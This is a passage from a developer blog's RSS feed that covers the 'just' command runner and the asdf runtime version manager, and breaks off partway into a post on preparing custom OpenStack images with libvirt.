<span data-line=""><span style="color: #F69D50">error:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Recipe</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">`</span><span style="color: #F69D50">check-dependencies</span><span style="color: #96D0FF">`</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">failed</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">on</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">line</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">12</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">with</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">exit</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">code</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">1</span></span></code></pre></div>
<p>This opens up a lot of possibilities! In the above <code>justfile</code> you'll notice I'm using a multi-line
command but I have <code>\</code> at the end of each line.  This is because <code>just</code> by default is going to run
each new line in their own shell.   So this just makes all those lines run in the same shell.</p>
<p>You do not have to use this syntax though.  Just is <code>polyglot</code> and can run commands from any language
you would like.</p>
<h3>Polyglot</h3>
<p>If you want to use a bash script as one of your commands, you can do so by adding a shebang at the top:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="make" data-theme="default"><code data-language="make" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #DCBDFB">check-dependencies</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #768390">#!/usr/bin/env bash</span></span>
<span data-line=""><span style="color: #ADBAC7">  set -euxo pipefail</span></span>
<span data-line=""><span style="color: #ADBAC7">  if [ ! "</span><span style="color: #96D0FF">$(</span><span style="color: #ADBAC7">node --version</span><span style="color: #96D0FF">)</span><span style="color: #ADBAC7">" = {{ node_version }} ];</span></span>
<span data-line=""><span style="color: #ADBAC7">  then</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #DCBDFB">echo</span><span style="color: #ADBAC7"> </span><span style="color: #DCBDFB">"Missing</span><span style="color: #ADBAC7"> </span><span style="color: #DCBDFB">node</span><span style="color: #ADBAC7"> </span><span style="color: #DCBDFB">version</span><span style="color: #ADBAC7">: {{ node_version }}"</span></span>
<span data-line=""><span style="color: #ADBAC7">    exit 1</span></span>
<span data-line=""><span style="color: #ADBAC7">  fi</span></span></code></pre></div>
<p>Now the entire command is using a bash script to execute! This gets really interesting if you want to start
using things like python, so if you'd like to change the dependency checker above to python:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="python" data-theme="default"><code data-language="python" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #ADBAC7">check</span><span style="color: #F47067">-</span><span style="color: #ADBAC7">dependencies:</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #768390">#!/usr/bin/env python3</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F47067">import</span><span style="color: #ADBAC7"> subprocess</span></span>
<span data-line=""><span style="color: #ADBAC7">  result </span><span style="color: #F47067">=</span><span style="color: #ADBAC7"> subprocess.run(</span></span>
<span data-line=""><span style="color: #ADBAC7">    [</span><span style="color: #96D0FF">'node'</span><span style="color: #ADBAC7">, </span><span style="color: #96D0FF">'--version'</span><span style="color: #ADBAC7">],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">stdout</span><span style="color: #F47067">=</span><span style="color: #ADBAC7">subprocess.</span><span style="color: #6CB6FF">PIPE</span></span>
<span data-line=""><span style="color: #ADBAC7">  )</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F47067">if</span><span style="color: #ADBAC7"> result </span><span style="color: #F47067">!=</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"</span><span style="color: #F47067">{{</span><span style="color: #96D0FF"> node_version </span><span style="color: #F47067">}}</span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #6CB6FF">print</span><span style="color: #ADBAC7">(</span><span style="color: #F47067">f</span><span style="color: #96D0FF">"Missing node version: </span><span style="color: #F47067">{{</span><span style="color: #96D0FF"> node_version </span><span style="color: #F47067">}}</span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7">)</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #6CB6FF">exit</span><span style="color: #ADBAC7">(</span><span style="color: #6CB6FF">1</span><span style="color: #ADBAC7">)</span></span></code></pre></div>
<p>You can even tell <code>just</code> that you want to use a specific language for all commands!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">set shell := ["python3", "-c"]</span></span></code></pre></div>
<p>This not only affects the commands you have in your recipe but also anything inside
backticks!  So something like:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="make" data-theme="default"><code data-language="make" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #ADBAC7">`print("Rust is the best programming language")`</span></span></code></pre></div>
<p>It would run through python instead of the shell.</p>
<h3>Enviornment Files</h3>
<p>One of the other modern things <code>just</code> adds to your workflow is the ability to utilize dotenv
files.  So for example if you want to define which port you launch your http server on, you can
create a file called <code>.env</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #ADBAC7">WEBSERVER_PORT</span><span style="color: #F47067">=</span><span style="color: #6CB6FF">9000</span></span></code></pre></div>
<p>and then utilize it in your <code>justfile</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="make" data-theme="default"><code data-language="make" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #ADBAC7">set dotenv-load</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #DCBDFB">http</span><span style="color: #ADBAC7">:</span></span>
<span data-line=""><span style="color: #ADBAC7">  @echo "Starting webserver in current directory"</span></span>
<span data-line=""><span style="color: #ADBAC7">  python3 -m http.server </span><span style="color: #6CB6FF">$W</span><span style="color: #ADBAC7">EBSERVER_PORT</span></span></code></pre></div>
<p>When you run <code>just http</code> it'll launch the http server on port 9000.  One important line
in this file is <code>set dotenv-load</code>, it will not load the <code>.env</code> file without you telling it to.</p>
<h2>Don't use language specific scripts!</h2>
<p>I'n not a fan of language specific command runners like <code>package.json</code> in the node community.</p>
<p>It always frustrates me when I start working on a project that heavily uses <code>scripts</code> in their
package.json instead of using a real command runner. <code>json</code> is not a great format for writing
discoverable CLI commands. For example if you wanted to write a <code>next.js</code> build script:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="json" data-theme="default"><code data-language="json" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">"scripts"</span><span style="color: #ADBAC7">: {</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">"predeploy"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"yarn build &#x26;&#x26; yarn export &#x26;&#x26; touch dist/.nojekyll &#x26;&#x26; echo sontek.net > dist/CNAME"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">"deploy"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"gh-pages -d dist -t true"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">"build"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"next build"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #8DDB8C">"export"</span><span style="color: #ADBAC7">: </span><span style="color: #96D0FF">"next export -o dist/"</span><span style="color: #ADBAC7">,</span></span>
<span data-line=""><span style="color: #ADBAC7">    },</span></span></code></pre></div>
<p>Combining all those commands is really messy and not easily understandable through <code>yarn run</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">yarn</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">run</span></span>
<span data-line=""><span style="color: #F69D50">yarn</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">run</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">v1.22.17</span></span>
<span data-line=""><span style="color: #F69D50">info</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Commands</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">available</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">from</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">binary</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">scripts:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">autoprefixer,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">browserslist,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">css-blank-pseudo,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">css-has-pseudo,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">css-prefers-color-scheme,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cssesc,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">esparse,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">esvalidate,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">extract-zip,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">gh-pages,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">gh-pages-clean,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">js-yaml,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">loose-envify,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">nanoid,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">next,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">prettier,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">resolve,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">rimraf,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">semver,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">svgo,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">uvu</span></span>
<span data-line=""><span style="color: #F69D50">info</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Project</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">commands</span></span>
<span data-line=""><span style="color: #ADBAC7">   </span><span style="color: #F69D50">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">build</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">next</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">build</span></span>
<span data-line=""><span style="color: #ADBAC7">   </span><span style="color: #F69D50">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">deploy</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">gh-pages</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">dist</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-t</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">true</span></span>
<span data-line=""><span style="color: #ADBAC7">   </span><span style="color: #F69D50">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">next</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">dist/</span></span>
<span data-line=""><span style="color: #ADBAC7">   </span><span style="color: #F69D50">-</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">predeploy</span></span>
<span data-line=""><span style="color: #ADBAC7">      </span><span style="color: #F69D50">yarn</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">build</span><span style="color: #ADBAC7"> &#x26;&#x26; </span><span style="color: #F69D50">yarn</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> &#x26;&#x26; </span><span style="color: #F69D50">touch</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">dist/.nojekyll</span><span style="color: #ADBAC7"> &#x26;&#x26; </span><span style="color: #6CB6FF">echo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sontek.net</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">></span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">dist/CNAME</span></span></code></pre></div>
<p>I'd much rather have this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">❯ just</span></span>
<span data-line=""><span style="color: #adbac7">Available recipes:</span></span>
<span data-line=""><span style="color: #adbac7">    build       # Build frontend assets</span></span>
<span data-line=""><span style="color: #adbac7">    deploy      # Deploy assets to cloudfront</span></span>
<span data-line=""><span style="color: #adbac7">    export      # Export to static assets (no SSR)</span></span></code></pre></div>
<h2>Conclusion</h2>
<p><a href="https://github.com/casey/just">Just</a> is a wonderful tool for building project specific CLIs without much effort. It is
a great replacement for <code>Make</code> if you are using it as a command runner and it has most of the features you'd need.</p>
<p>I recommend adding a <code>justfile</code> to your projects today! If you'd like to see a real world example of how to use <code>just</code>,
you can check out the one I use to maintain my <a href="https://github.com/sontek/homies/blob/master/justfile">home directory</a>!</p>]]></description>
            <link>https://sontek.net/blog/2022/intro_to_just</link>
            <guid isPermaLink="true">https://sontek.net/blog/2022/intro_to_just</guid>
            <pubDate>Sat, 26 Feb 2022 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[Use asdf to manage Python, NodeJS, GoLang and more!]]></title>
            <description><![CDATA[<p><a href="https://asdf-vm.com/">asdf</a> is a general purpose version manager that
can manage versions of most programming language runtimes through a set
of plugins.</p>
<iframe width="854" height="480" src="https://www.youtube.com/embed/RTaqWRj-6Lg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
<p>With micro-services being all the rage and the ever changing landscape
of the development world, it is rare to utilize a single version of
language runtime. Even when you want to upgrade from one to the other
you'll need both usable on your system at the same time.</p>
<p>I've used tools like <code>pyenv</code> and <code>nvm</code> in the past when I needed to change
versions depending on which project I'm contributing to. But with <code>asdf</code>
you have one tool to rule them all!</p>
<h2>Getting Started</h2>
<p>The first thing you need to do when working with <code>asdf</code> is grab the
plugins for the languages you are interested in working with. You can list
what plugins are available:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> asdf plugin list all</span></span>
<span data-line=""><span style="color: #F69D50">golang</span><span style="color: #ADBAC7">                       </span><span style="color: #6CB6FF">*</span><span style="color: #96D0FF">https://github.com/kennyp/asdf-golang.git</span></span>
<span data-line=""><span style="color: #F69D50">golangci-lint</span><span style="color: #ADBAC7">                 </span><span style="color: #96D0FF">https://github.com/hypnoglow/asdf-golangci-lint.git</span></span>
<span data-line=""><span style="color: #F69D50">nodejs</span><span style="color: #ADBAC7">                       </span><span style="color: #6CB6FF">*</span><span style="color: #96D0FF">https://github.com/asdf-vm/asdf-nodejs.git</span></span>
<span data-line=""><span style="color: #F69D50">poetry</span><span style="color: #ADBAC7">                       </span><span style="color: #6CB6FF">*</span><span style="color: #96D0FF">https://github.com/asdf-community/asdf-poetry.git</span></span>
<span data-line=""><span style="color: #F69D50">python</span><span style="color: #ADBAC7">                       </span><span style="color: #6CB6FF">*</span><span style="color: #96D0FF">https://github.com/danhper/asdf-python.git</span></span>
<span data-line=""><span style="color: #F69D50">yarn</span><span style="color: #ADBAC7">                         </span><span style="color: #6CB6FF">*</span><span style="color: #96D0FF">https://github.com/twuni/asdf-yarn.git</span></span></code></pre></div>
<p>On the left will be the name of the plugin and on the right will be the repository
where it lives.  It'll me marked with an asterisk if you already have it installed.</p>
<p>To install a plugin you say <code>asdf plugin add &#x3C;plugin></code> to get it installed.  You can
also provide the repository where you want it pulled from, for example:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> asdf plugin add nodejs https://github.com/asdf-vm/asdf-nodejs.git</span></span>
<span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> asdf plugin add python https://github.com/danhper/asdf-python.git</span></span></code></pre></div>
<p>This will not give you any version of those languages, it is only installing the
plugin that knows how to work with those languages.   You are ready to pull down
any versions you want at that point:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> asdf install nodejs 14.19.0</span></span>
<span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> asdf install python 3.9.10</span></span></code></pre></div>
<p>Once you have the versions installed you will be able to view them like this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> asdf list</span></span>
<span data-line=""><span style="color: #F69D50">golang</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">1.17.7</span></span>
<span data-line=""><span style="color: #F69D50">nodejs</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">--help</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">12.22.10</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">14.19.0</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">16.14.0</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">17.5.0</span></span>
<span data-line=""><span style="color: #F69D50">poetry</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">1.1.13</span></span>
<span data-line=""><span style="color: #F69D50">python</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">3.9.10</span></span>
<span data-line=""><span style="color: #F69D50">yarn</span></span>
<span data-line=""><span style="color: #ADBAC7">  </span><span style="color: #F69D50">1.22.17</span></span></code></pre></div>
<h2>Using the installed languages</h2>
<p>To activate a specific version of a language you have you have three options:</p>
<h3>Make it global</h3>
<p>You can make it global, meaning when you run the tool like <code>python</code> it'll use
this version for the system:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> asdf global python 3.9.10</span></span></code></pre></div>
<h3>Make it local</h3>
<p>You can make it local, which means it will generate a file in the current
directory named <code>.tool-versions</code> and so whenever you change into a directory
it will activate the versions defined in there.</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> asdf local nodejs 12.22.10</span></span>
<span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> cat .tool-versions </span></span>
<span data-line=""><span style="color: #F69D50">nodejs</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">12.22</span><span style="color: #96D0FF">.10</span></span></code></pre></div>
<p>The great thing about this is you can commit that file to git and then anyone
who checks out the project and uses <code>asdf</code> will have the same versions activated!</p>
<h3>Temporary</h3>
<p>If you want to activate a version of a language temporarily you can swap to it
for the current shell:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> asdf shell golang 1.17.7</span></span>
<span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> env</span><span style="color: #F47067">|</span><span style="color: #F69D50">grep</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-i</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ASDF</span></span>
<span data-line=""><span style="color: #ADBAC7">ASDF_GOLANG_VERSION</span><span style="color: #F47067">=</span><span style="color: #6CB6FF">1.17</span><span style="color: #96D0FF">.7</span></span></code></pre></div>
<p>It sets an environment variable that will have preference over the file. If you
ever wonder what versions a directory is using you can run:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F47067">></span><span style="color: #ADBAC7"> asdf current</span></span>
<span data-line=""><span style="color: #F69D50">golang</span><span style="color: #ADBAC7">          </span><span style="color: #96D0FF">______</span><span style="color: #ADBAC7">          </span><span style="color: #96D0FF">No</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">version</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">set.</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Run</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"asdf &#x3C;global|shell|local> golang &#x3C;version>"</span></span>
<span data-line=""><span style="color: #F69D50">nodejs</span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">12.22</span><span style="color: #96D0FF">.10</span><span style="color: #ADBAC7">        </span><span style="color: #96D0FF">.tool-versions</span></span>
<span data-line=""><span style="color: #F69D50">poetry</span><span style="color: #ADBAC7">          </span><span style="color: #96D0FF">______</span><span style="color: #ADBAC7">          </span><span style="color: #96D0FF">No</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">version</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">set.</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Run</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"asdf &#x3C;global|shell|local> poetry &#x3C;version>"</span></span>
<span data-line=""><span style="color: #F69D50">python</span><span style="color: #ADBAC7">          </span><span style="color: #6CB6FF">3.9</span><span style="color: #96D0FF">.10</span><span style="color: #ADBAC7">          </span><span style="color: #96D0FF">.tool-versions</span></span>
<span data-line=""><span style="color: #F69D50">yarn</span><span style="color: #ADBAC7">            </span><span style="color: #6CB6FF">1.22</span><span style="color: #96D0FF">.17</span><span style="color: #ADBAC7">         </span><span style="color: #96D0FF">.tool-versions</span></span></code></pre></div>
<h2>Conclusion</h2>
<p><a href="https://asdf-vm.com/">asdf</a>  is an AWESOME tool to utilize if you find yourself using many
different languages or many different versions of the same language. You should check it out
and see if it can improve your workflow.</p>]]></description>
            <link>https://sontek.net/blog/2022/intro_to_asdf</link>
            <guid isPermaLink="true">https://sontek.net/blog/2022/intro_to_asdf</guid>
            <pubDate>Fri, 18 Feb 2022 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[Preparing custom images for OpenStack]]></title>
            <description><![CDATA[<p>This article will show you how to use libvirt to create base images that
can be uploaded to OpenStack.</p>
<h1>Why would you want to do this?</h1>
<p>Linux distributions like Fedora and Ubuntu already ship "cloud" images
and most providers also have their own custom images for you to use, but
I find it much more comforting to have full control of the software that
is installed and I like the ability to easily apply new security patches
to base images.</p>
<p>I wouldn't use images to replace config management (CM) with something
like <a href="http://www.saltstack.com/">Salt</a> or
<a href="http://www.ansible.com/">Ansible</a> but they are nice to give sane system
defaults in things like <code>grub.conf</code>, <code>sysctl.conf</code>, and shipping a Chef
or Salt agent so that your CM engine can communicate with your server
right away.</p>
<h1>Setting up your environment</h1>
<p>The first thing you need to do is get a minimal install disk for the
Linux distribution you want to use. I prefer using Fedora netinst disks
but another popular option is Ubuntu Server.</p>
<p>To get the latest Fedora here, you can choose "netinst" under Direct
Downloads: <a href="http://fedoraproject.org/en/get-fedora-all">http://fedoraproject.org/en/get-fedora-all</a></p>
<p>To get the latest Ubuntu you can go here:
<a href="http://www.ubuntu.com/download/server">http://www.ubuntu.com/download/server</a></p>
<p>Once you have acquired your distribution of choice you just need to
verify that you have <code>virt-install</code> and <code>virt-viewer</code> installed:</p>
<p>Fedora:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">yum</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">virt-install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">virt-viewer</span></span></code></pre></div>
<p>Ubuntu:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">virtinst</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">virt-viewer</span></span></code></pre></div>
<p>If you prefer a graphical user interface, you may use <code>virt-manager</code>
instead, but I try to keep everything in the CLI; that way it can be
repeated easily.</p>
<h1>Preparing your disk</h1>
<p>Now that you have a base ISO and the tools necessary, let's get started
by creating a disk to install the virtual server into. Resizing an image
isn't an impossible task but it is much easier to choose a reasonably
sized disk for the purpose it will be used for.</p>
<p>I primarily use 8 GB disks -- that way we can fit all the system
components required as well as our own web applications. Any large files
should be placed in a SAN or something like Dreamhost's dreamobjects.</p>
<p>The other big decision you must make upfront is what disk format you
want to use -- the trade-off is disk space vs performance. The two
primary formats are qcow2 (QEMU Copy on Write) and Raw. qcow2 is great
if you have limited disk space and don't want to allocate the full 8 GB
up front. Raw is preferred if you want the best performance.</p>
<p>If you choose qcow2, you'll also need to make sure you have <code>qemu-img</code>:</p>
<p>Fedora:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">yum</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">qemu-img</span></span></code></pre></div>
<p>Ubuntu:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">qemu-utils</span></span></code></pre></div>
<p>Create a raw disk:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">fallocate</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-l</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">8192</span><span style="color: #96D0FF">M</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">server.img</span></span></code></pre></div>
<p>Create a qcow2 disk:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">qemu-img</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">create</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-f</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">qcow2</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">server.qcow2</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">8</span><span style="color: #96D0FF">G</span></span></code></pre></div>
<h1>Installing your distribution onto the disk</h1>
<p>We will use the <code>virt-install</code> command to get the distribution installed
onto the disk image.</p>
<p>To install Fedora on a qcow2 disk image:</p>
